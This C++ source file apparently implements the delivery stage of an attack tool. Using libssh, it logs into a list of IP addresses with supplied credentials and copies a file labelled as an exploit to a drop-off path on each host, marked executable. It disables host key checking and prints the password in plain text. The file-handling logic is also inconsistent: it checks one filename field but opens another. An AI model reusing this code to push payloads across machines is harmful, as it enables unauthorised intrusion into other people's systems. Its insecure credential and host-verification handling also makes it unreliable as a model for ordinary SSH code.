#include "ssh_login.h"

void session_connect(ssh_session ssh_session, ssh_session_data sessionData){
    int rc = ssh_connect(ssh_session);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to localhost: %s\n", ssh_get_error(ssh_session));
        exit(-1);
    } else {
        printf("Success!\n");
    }

    std::string password = sessionData.password;
    std::string username = sessionData.username;
    std::cout << "Username used: " << username << std::endl;
    std::cout << "Password used: " << password << std::endl;
    rc = ssh_userauth_password(ssh_session, username.c_str(), password.c_str());
    if (rc != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(ssh_session));
        ssh_disconnect(ssh_session);
        exit(-1);
    }

    if (sessionData.protocol == "scp") {
        SCP_Handler(ssh_session,sessionData);
    } else if (sessionData.protocol == "ssh") {
        // Do something if the protocol is "ssh"
    }
    
    ssh_disconnect(ssh_session);
}

void SSH_Handler(ssh_session_data sessionData){
    ssh_session ssh_session = ssh_new();
    if (ssh_session == NULL) {
        fprintf(stderr, "Error creating SSH session\n");
        return;
    }

    int verbosity = SSH_OPTIONS_LOG_VERBOSITY;
    ssh_options_set(ssh_session, SSH_OPTIONS_PORT, &sessionData.port);
    ssh_options_set(ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, "no");

    for (const auto& ipAddress : sessionData.ipAddresses) {
        ssh_options_set(ssh_session, SSH_OPTIONS_HOST, ipAddress.c_str());
        session_connect(ssh_session, sessionData); // Pass sessionData by value
    }

    ssh_free(ssh_session);
}

int SCP_Handler(ssh_session ssh_session, ssh_session_data sessionData) {
    ssh_scp scp_session;
    int rc;

    // Start an SCP session for sending
    scp_session = ssh_scp_new(ssh_session, SSH_SCP_WRITE, sessionData.DROPOFF.c_str());
    if (scp_session == NULL) {
        fprintf(stderr, "Error creating SCP session: %s\n", ssh_get_error(ssh_session));
        return SSH_ERROR;
    }

    // Initialize the SCP session
    rc = ssh_scp_init(scp_session);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error initializing SCP session: %s\n", ssh_get_error(ssh_session));
        ssh_scp_free(scp_session);
        return rc;
    }

 
    struct stat file_info;
    if (stat(sessionData.EXPLOIT_NAME.c_str(), &file_info) != 0) {
        std::cerr << "Error getting file information for " << sessionData.EXPLOIT_FILE << std::endl;
        return 1;
    }

    size_t file_size = file_info.st_size;
    std::cout << "File Sent: " << sessionData.EXPLOIT_NAME << std::endl;
    std::cout << "File size: " << file_size << " bytes" << std::endl;

    // Push the file
    rc = ssh_scp_push_file(scp_session, sessionData.EXPLOIT_NAME.c_str(), file_size, S_IRWXU);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error sending file: %s\n", ssh_get_error(ssh_session));
        ssh_scp_free(scp_session);
        return rc;
    } else {
        printf("File sent!\n");
    }

    // Open the local file for reading
    FILE *local_file = fopen(sessionData.EXPLOIT_FILE.c_str(), "rb");
    if (local_file == NULL) {
        fprintf(stderr, "Error opening local file: %s\n", strerror(errno));
        ssh_scp_free(scp_session);
        return SSH_ERROR;
    }

    // Allocate buffer dynamically based on file size
    size_t buffer_size = file_size;
    char *buffer = (char *)malloc(buffer_size);
    if (buffer == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        fclose(local_file);
        ssh_scp_close(scp_session);
        ssh_scp_free(scp_session);
        return SSH_ERROR;
    }

    // Read and write the file content
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, buffer_size, local_file)) > 0) {
        if (ssh_scp_write(scp_session, buffer, bytes_read) != SSH_OK) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(ssh_session));
            fclose(local_file);
            free(buffer);
            ssh_scp_close(scp_session);
            ssh_scp_free(scp_session);
            return SSH_ERROR;
        }
    }

    // Close the local file and free the buffer
    fclose(local_file);
    free(buffer);

    // Close SCP session
    ssh_scp_close(scp_session);
    ssh_scp_free(scp_session);

    return SSH_OK;
}